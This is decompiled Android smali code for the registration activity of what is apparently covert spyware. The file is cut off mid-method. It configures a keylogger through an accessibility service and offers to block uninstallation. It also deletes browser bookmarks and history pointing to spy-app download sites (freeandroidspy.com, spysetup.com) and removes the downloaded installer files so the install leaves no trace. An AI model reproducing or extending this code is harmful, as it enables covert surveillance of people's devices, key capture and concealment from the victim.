.class public Lcom/hp/vd/RegisterActivity;
.super Landroid/app/Activity;
.source "RegisterActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/hp/vd/RegisterActivity$ApplicationImageFilter;,
        Lcom/hp/vd/RegisterActivity$ResponseCombo;
    }
.end annotation


# static fields
.field protected static final BUNDLE_KEY_TOS:Ljava/lang/String; = "BUNDLE_KEY_TOS"

.field protected static final REQUEST_ACCESSIBILITY_SERVICE:I = 0x309

.field protected static final REQUEST_ENABLE_ADMIN:I = 0x3d1

.field protected static lastError:Ljava/lang/String;

.field protected static proceedWithPPEnabled:Ljava/lang/Boolean;

.field protected static tosStatus:Ljava/lang/Boolean;


# instance fields
.field buttonCompleteInstallation:Landroid/widget/Button;

.field checkboxEnableKeylogger:Landroid/widget/CheckBox;

.field checkboxPreventUninstallation:Landroid/widget/CheckBox;

.field checkboxTos:Landroid/widget/CheckBox;

.field protected context:Lcom/hp/vd/context/Context;

.field editTextEmailFirst:Landroid/widget/EditText;

.field private declaredRuntimePermissions:Ljava/util/Set;

.field editTextEmailSecond:Landroid/widget/EditText;

.field editTextEndpoint:Landroid/widget/EditText;

.field protected installWithoutDac:Z

.field protected installable:Z

.field protected lastAlertDialog:Landroid/app/AlertDialog;

.field public loading_dialog:Landroid/app/ProgressDialog;

.field textViewEnableKeylogger:Landroid/widget/TextView;

.field textViewEnableSecondaryApp:Landroid/widget/TextView;

.field textViewPreventUninstallation:Landroid/widget/TextView;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x0

    .line 187
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    sput-object v1, Lcom/hp/vd/RegisterActivity;->tosStatus:Ljava/lang/Boolean;

    .line 188
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/hp/vd/RegisterActivity;->proceedWithPPEnabled:Ljava/lang/Boolean;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 146
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/4 v0, 0x1

    .line 162
    iput-boolean v0, p0, Lcom/hp/vd/RegisterActivity;->installable:Z

    const/4 v0, 0x0

    .line 163
    iput-boolean v0, p0, Lcom/hp/vd/RegisterActivity;->installWithoutDac:Z

    const/4 v0, 0x0

    .line 176
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->checkboxTos:Landroid/widget/CheckBox;

    .line 177
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->checkboxPreventUninstallation:Landroid/widget/CheckBox;

    .line 178
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->checkboxEnableKeylogger:Landroid/widget/CheckBox;

    .line 180
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->editTextEmailFirst:Landroid/widget/EditText;

    .line 181
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->editTextEmailSecond:Landroid/widget/EditText;

    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->editTextEndpoint:Landroid/widget/EditText;

    .line 182
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->editTextEndpoint:Landroid/widget/EditText;

    .line 183
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    .line 183
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->textViewPreventUninstallation:Landroid/widget/TextView;

    .line 184
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->textViewEnableKeylogger:Landroid/widget/TextView;

    .line 185
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->textViewEnableSecondaryApp:Landroid/widget/TextView;

    return-void
.end method


# virtual methods
.method public acceptTos(Landroid/view/View;)V
    .locals 3

    .line 641
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity;->checkboxTos:Landroid/widget/CheckBox;

    const/4 v0, 0x0

    if-eqz p1, :cond_0

    invoke-virtual {p1}, Landroid/widget/CheckBox;->isChecked()Z

    move-result v0

    :cond_0
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/hp/vd/RegisterActivity;->tosStatus:Ljava/lang/Boolean;

    .line 642
    invoke-direct {p0, v0}, Lcom/hp/vd/RegisterActivity;->persistTosStatus(Z)V

    .line 643
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->adjustInterfaceElementsAccordingToTos()V

    return-void
.end method

.method protected adjustInterfaceElementsAccordingToTos()V
    .locals 2

    const/4 v0, 0x0

    .line 192
    sget-object v1, Lcom/hp/vd/RegisterActivity;->tosStatus:Ljava/lang/Boolean;

    if-eqz v1, :cond_0

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    :cond_0
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->checkboxTos:Landroid/widget/CheckBox;

    if-eqz v1, :cond_1

    invoke-virtual {v1, v0}, Landroid/widget/CheckBox;->setChecked(Z)V

    :cond_1
    invoke-direct {p0, v0}, Lcom/hp/vd/RegisterActivity;->setTosDependentControlsEnabled(Z)V

    return-void
.end method

.method public completeInstallationOnClick(Landroid/view/View;)V
    .locals 6

    .line 389
    iget-boolean p1, p0, Lcom/hp/vd/RegisterActivity;->installable:Z

    if-nez p1, :cond_0

    return-void

    :cond_0
    const/4 p1, 0x0

    .line 393
    iput-boolean p1, p0, Lcom/hp/vd/RegisterActivity;->installable:Z

    .line 394
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    invoke-virtual {v0, p1}, Landroid/widget/Button;->setClickable(Z)V

    .line 395
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    invoke-virtual {v0, p1}, Landroid/widget/Button;->setEnabled(Z)V

    .line 413
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->editTextEmailFirst:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v1, 0x0

    const v2, 0x7f090005

    const/4 v3, 0x1

    if-nez v0, :cond_1

    .line 415
    invoke-virtual {p0, v2}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    const v0, 0x7f090003

    .line 416
    invoke-virtual {p0, v0}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    .line 414
    invoke-virtual {p0, p1, v0, v1}, Lcom/hp/vd/RegisterActivity;->showAlert(Ljava/lang/String;Ljava/lang/String;Landroid/content/DialogInterface$OnClickListener;)V

    .line 419
    iput-boolean v3, p0, Lcom/hp/vd/RegisterActivity;->installable:Z

    .line 420
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    invoke-virtual {p1, v3}, Landroid/widget/Button;->setClickable(Z)V

    .line 421
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    invoke-virtual {p1, v3}, Landroid/widget/Button;->setEnabled(Z)V

    return-void

    .line 426
    :cond_1
    sget-object v0, Landroid/util/Patterns;->EMAIL_ADDRESS:Ljava/util/regex/Pattern;

    iget-object v4, p0, Lcom/hp/vd/RegisterActivity;->editTextEmailFirst:Landroid/widget/EditText;

    invoke-virtual {v4}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/regex/Matcher;->matches()Z

    move-result v0

    if-nez v0, :cond_2

    .line 428
    invoke-virtual {p0, v2}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    const v0, 0x7f090004

    .line 429
    invoke-virtual {p0, v0}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    .line 427
    invoke-virtual {p0, p1, v0, v1}, Lcom/hp/vd/RegisterActivity;->showAlert(Ljava/lang/String;Ljava/lang/String;Landroid/content/DialogInterface$OnClickListener;)V

    .line 432
    iput-boolean v3, p0, Lcom/hp/vd/RegisterActivity;->installable:Z

    .line 433
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    invoke-virtual {p1, v3}, Landroid/widget/Button;->setClickable(Z)V

    .line 434
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    invoke-virtual {p1, v3}, Landroid/widget/Button;->setEnabled(Z)V

    return-void

    .line 439
    :cond_2
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->editTextEmailFirst:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 440
    iget-object v4, p0, Lcom/hp/vd/RegisterActivity;->editTextEmailSecond:Landroid/widget/EditText;

    invoke-virtual {v4}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    .line 442
    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    .line 444
    invoke-virtual {p0, v2}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    const v0, 0x7f090002

    .line 445
    invoke-virtual {p0, v0}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    .line 443
    invoke-virtual {p0, p1, v0, v1}, Lcom/hp/vd/RegisterActivity;->showAlert(Ljava/lang/String;Ljava/lang/String;Landroid/content/DialogInterface$OnClickListener;)V

    .line 448
    iput-boolean v3, p0, Lcom/hp/vd/RegisterActivity;->installable:Z

    .line 449
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    invoke-virtual {p1, v3}, Landroid/widget/Button;->setClickable(Z)V

    .line 450
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    invoke-virtual {p1, v3}, Landroid/widget/Button;->setEnabled(Z)V

    return-void

    :cond_3
    iget-object v5, p0, Lcom/hp/vd/RegisterActivity;->editTextEndpoint:Landroid/widget/EditText;

    if-eqz v5, :cond_endpoint_done

    invoke-virtual {v5}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_endpoint_clear

    :try_start_0
    invoke-static {v5}, Ljava/net/URI;->create(Ljava/lang/String;)Ljava/net/URI;

    move-result-object v0

    invoke-virtual {v0}, Ljava/net/URI;->getScheme()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_invalid_endpoint

    const-string v2, "http"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_endpoint_scheme_ok

    const-string v2, "https"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_endpoint_scheme_ok

    goto :cond_invalid_endpoint

    :cond_endpoint_scheme_ok
    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v5}, Lcom/hp/vd/agent/InstallHelper;->setEndpoint(Landroid/content/Context;Ljava/lang/String;)V

    :try_end_0
    goto :cond_endpoint_done

    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_endpoint_invalid

    :catch_endpoint_invalid
    move-exception v0

    goto :cond_invalid_endpoint

    :cond_endpoint_clear
    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v5}, Lcom/hp/vd/agent/InstallHelper;->setEndpoint(Landroid/content/Context;Ljava/lang/String;)V

    goto :cond_endpoint_done

    :cond_invalid_endpoint
    const v0, 0x7f090069

    invoke-virtual {p0, v0}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    const v0, 0x7f09006a

    invoke-virtual {p0, v0}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, p1, v0, v1}, Lcom/hp/vd/RegisterActivity;->showAlert(Ljava/lang/String;Ljava/lang/String;Landroid/content/DialogInterface$OnClickListener;)V

    iput-boolean v3, p0, Lcom/hp/vd/RegisterActivity;->installable:Z

    iget-object p1, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    invoke-virtual {p1, v3}, Landroid/widget/Button;->setClickable(Z)V

    iget-object p1, p0, Lcom/hp/vd/RegisterActivity;->buttonCompleteInstallation:Landroid/widget/Button;

    invoke-virtual {p1, v3}, Landroid/widget/Button;->setEnabled(Z)V

    return-void

    :cond_endpoint_done
    const-string v0, "system"

    .line 459
    invoke-virtual {p0, v0, p1}, Lcom/hp/vd/RegisterActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    .line 464
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string v0, "email"

    .line 466
    invoke-interface {p1, v0, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 471
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    const p1, 0x7f09005a

    .line 518
    invoke-virtual {p0, p1}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object p1

    const v0, 0x7f090054

    .line 519
    invoke-virtual {p0, v0}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    .line 516
    invoke-static {p0, p1, v0}, Landroid/app/ProgressDialog;->show(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Landroid/app/ProgressDialog;

    move-result-object p1

    .line 522
    new-instance v0, Lcom/hp/vd/RegisterActivity$3;

    invoke-direct {v0, p0, p1}, Lcom/hp/vd/RegisterActivity$3;-><init>(Lcom/hp/vd/RegisterActivity;Landroid/app/ProgressDialog;)V

    .line 624
    new-instance p1, Ljava/lang/Thread;

    new-instance v1, Lcom/hp/vd/RegisterActivity$4;

    invoke-direct {v1, p0, v0}, Lcom/hp/vd/RegisterActivity$4;-><init>(Lcom/hp/vd/RegisterActivity;Landroid/os/Handler;)V

    const-string v0, "Installation Thread"

    invoke-direct {p1, v1, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 636
    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method protected deleteApplicationImage()V
    .locals 4

    .line 1167
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v2, "/Download/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 1169
    new-instance v1, Lcom/hp/vd/RegisterActivity$ApplicationImageFilter;

    const/4 v2, 0x0

    invoke-direct {v1, v2}, Lcom/hp/vd/RegisterActivity$ApplicationImageFilter;-><init>(Lcom/hp/vd/RegisterActivity$1;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FileFilter;)[Ljava/io/File;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 1172
    array-length v1, v0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v1, :cond_0

    aget-object v3, v0, v2

    .line 1173
    invoke-virtual {v3}, Ljava/io/File;->delete()Z

    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_0
    return-void
.end method

.method protected deleteBrowserHistory()V
    .locals 4

    .line 1119
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 1120
    sget-object v1, Landroid/provider/Browser;->BOOKMARKS_URI:Landroid/net/Uri;

    :try_start_0
    const-string v2, "url like \'%freeandroidspy.com%\' or url like \'%spysetup.com%\' or url like \'%spysetup.co%\' or url like \'%ytubecache.com%\' or url like \'%my.freeandroidspy.com%\'"

    const/4 v3, 0x0

    .line 1132
    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method protected deleteSecondaryAppDropImage()V
    .locals 3

    .line 1151
    :try_start_0
    new-instance v0, Ljava/io/File;

    .line 1152
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    new-instance v2, Lcom/hp/vd/agent/Configuration;

    invoke-direct {v2}, Lcom/hp/vd/agent/Configuration;-><init>()V

    .line 1153
    invoke-virtual {v2}, Lcom/hp/vd/agent/Configuration;->getSecondaryApplicationDefaultDropFilename()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 1156
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 1157
    invoke-virtual {v0}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 1161
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_0
    :goto_0
    return-void
.end method

.method public enableKeyLogger(Landroid/view/View;)V
    .locals 3

    .line 669
    const-class p1, Lcom/hp/vd/MainAccesssibilityService;

    invoke-virtual {p1}, Ljava/lang/Class;->getCanonicalName()Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1}, Lcom/hp/vd/agent/InstallHelper;->isAccessibilityServiceEnabled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 670
    iget-object p1, p0, Lcom/hp/vd/RegisterActivity;->checkboxEnableKeylogger:Landroid/widget/CheckBox;

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/widget/CheckBox;->setChecked(Z)V

    return-void

    .line 675
    :cond_0
    new-instance p1, Landroid/app/AlertDialog$Builder;

    invoke-direct {p1, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const v0, 0x7f09004a

    .line 676
    invoke-virtual {p0, v0}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const v0, 0x7f09004c

    .line 678
    invoke-virtual {p0, v0}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const/4 v1, 0x0

    .line 679
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const v1, 0x7f090055

    .line 680
    invoke-virtual {p0, v1}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/hp/vd/RegisterActivity$6;

    invoke-direct {v2, p0}, Lcom/hp/vd/RegisterActivity$6;-><init>(Lcom/hp/vd/RegisterActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    const v1, 0x7f090049

    .line 685
    invoke-virtual {p0, v1}, Lcom/hp/vd/RegisterActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lcom/hp/vd/RegisterActivity$5;

    invoke-direct {v2, p0}, Lcom/hp/vd/RegisterActivity$5;-><init>(Lcom/hp/vd/RegisterActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 692
    invoke-virtual {p1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object p1

    .line 693
    invoke-virtual {p1}, Landroid/app/AlertDialog;->show()V

    return-void
.end method

.method protected extractModuleName(Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    const-string v0, "unknown"

    if-nez p1, :cond_0

    return-object v0

    :cond_0
    :try_start_0
    const-string v1, "\\."

    .line 1206
    invoke-virtual {p1, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    .line 1207
    array-length v1, p1

    add-int/lit8 v1, v1, -0x1

    aget-object p1, p1, v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 1210
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    move-object p1, v0

    :goto_0
    return-object p1
.end method

.method protected getDeviceIdentifier(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    const-string v0, "__UNAVAILABLE__"

    .line 1086
    :try_start_0
    new-instance v1, Lcom/hp/vd/context/Context;

    invoke-direct {v1}, Lcom/hp/vd/context/Context;-><init>()V

    .line 1087
    invoke-virtual {v1, p0}, Lcom/hp/vd/context/Context;->setApplicationContext(Landroid/content/Context;)V

    .line 1089
    new-instance v2, Lcom/hp/vd/agent/Utility;

    invoke-direct {v2, v1}, Lcom/hp/vd/agent/Utility;-><init>(Lcom/hp/vd/context/Context;)V

    .line 1090
    invoke-virtual {v2, p1}, Lcom/hp/vd/agent/Utility;->getUniqueIdentifier(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 1093
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    move-object p1, v0

    :goto_0
    return-object p1
.end method

.method protected initialize()Z
    .locals 2

    .line 780
    new-instance v0, Lcom/hp/vd/context/Context;

    invoke-direct {v0}, Lcom/hp/vd/context/Context;-><init>()V

    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    .line 781
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/hp/vd/context/Context;->setApplicationContext(Landroid/content/Context;)V

    .line 782
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    const-class v1, Lcom/hp/vd/data/persistency/DatabaseHelper;

    invoke-static {p0, v1}, Lcom/j256/ormlite/android/apptools/OpenHelperManager;->getHelper(Landroid/content/Context;Ljava/lang/Class;)Lcom/j256/ormlite/android/apptools/OrmLiteSqliteOpenHelper;

    move-result-object v1

    check-cast v1, Lcom/hp/vd/data/persistency/DatabaseHelper;

    invoke-virtual {v0, v1}, Lcom/hp/vd/context/Context;->setHelper(Lcom/hp/vd/data/persistency/DatabaseHelper;)V

    .line 784
    new-instance v0, Lcom/hp/vd/agent/Utility;

    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-direct {v0, v1}, Lcom/hp/vd/agent/Utility;-><init>(Lcom/hp/vd/context/Context;)V

    .line 785
    iget-object v1, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1, v0}, Lcom/hp/vd/context/Context;->setUtility(Lcom/hp/vd/agent/Utility;)V

    .line 792
    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    const/4 v0, 0x1

    return v0
.end method

.method private ensureDeclaredPermissionsCache()Ljava/util/Set;
    .locals 6

    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->declaredRuntimePermissions:Ljava/util/Set;

    if-eqz v0, :cond_0

    return-object v0

    :cond_0
    const/16 v0, 0x1000

    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2, v0}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/PackageInfo;->requestedPermissions:[Ljava/lang/String;

    if-nez v0, :cond_1

    invoke-static {}, Ljava/util/Collections;->emptySet()Ljava/util/Set;

    move-result-object v0

    goto :goto_1

    :cond_1
    array-length v1, v0

    new-instance v2, Ljava/util/HashSet;

    invoke-direct {v2, v1}, Ljava/util/HashSet;-><init>(I)V

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v1, :cond_2

    aget-object v4, v0, v3

    if-eqz v4, :cond_3

    invoke-interface {v2, v4}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    :cond_3
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_2
    move-object v0, v2

    :goto_1
    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->declaredRuntimePermissions:Ljava/util/Set;

    :goto_2
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {}, Ljava/util/Collections;->emptySet()Ljava/util/Set;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->declaredRuntimePermissions:Ljava/util/Set;

    goto :goto_2

    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
.end method

.method private persistTosStatus(Z)V
    .locals 3

    const-string v0, "system"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    if-eqz v0, :cond_0

    const-string v1, "BUNDLE_KEY_TOS"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_0
    return-void
.end method
.method private setTosDependentControlsEnabled(Z)V
    .locals 1

    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->checkboxPreventUninstallation:Landroid/widget/CheckBox;

    if-eqz v0, :cond_0

    invoke-virtual {v0, p1}, Landroid/widget/CheckBox;->setEnabled(Z)V

    :cond_0
